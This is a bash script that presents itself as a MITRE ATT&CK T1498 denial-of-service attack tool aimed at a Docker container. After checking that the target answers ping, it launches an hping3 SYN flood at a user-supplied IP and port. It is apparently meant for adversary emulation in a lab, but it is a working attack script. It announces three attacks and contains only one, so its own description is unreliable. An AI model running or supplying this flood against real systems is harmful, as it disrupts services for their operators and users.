#!/bin/bash

# T1498: Network Denial of Service (DoS) Attack Script for Docker Container Server
# This script will perform multiple types of DoS attacks against a target server.

# Target Docker container IP address and SSH port
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <target_ip> <target_port>"
    exit 1
fi

TARGET_IP="$1"          # Target IP address
TARGET_PORT="$2"       # Target port
INTERFACE="eth0"           # Network interface used to send packets
PACKET_RATE="500"          # Packet rate per second for hping3 attack (adjust accordingly)

# Step 0: Check if target web service is reachable
# Step 0: Check if target web service is reachable, with retries
MAX_RETRIES=4
RETRY_COUNT=0
echo "Using TARGET_IP=$TARGET_IP and TARGET_PORT=$TARGET_PORT"

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
  ping -c 4 -W 5 $TARGET_IP &> /dev/null
  if [ $? -eq 0 ]; then
    echo "Target server is reachable. Proceeding with the attack..."
    break
  else
    RETRY_COUNT=$((RETRY_COUNT + 1))
    echo "Retry $RETRY_COUNT/$MAX_RETRIES: Target server not reachable. Retrying..."
    sleep 4
  fi
done

if [ $RETRY_COUNT -eq $MAX_RETRIES ]; then
  echo "Target server is not reachable after $MAX_RETRIES attempts. Attack aborted."
  exit 1
fi


echo "Starting Network Denial of Service attacks against Docker container at $TARGET_IP:$TARGET_PORT ..."

# Step 1: SYN Flood Attack using hping3
echo "[1/3] Performing SYN Flood Attack on Port $TARGET_PORT..."
timeout 2 hping3 -S -p $TARGET_PORT --flood $TARGET_IP

echo "Attacks completed."

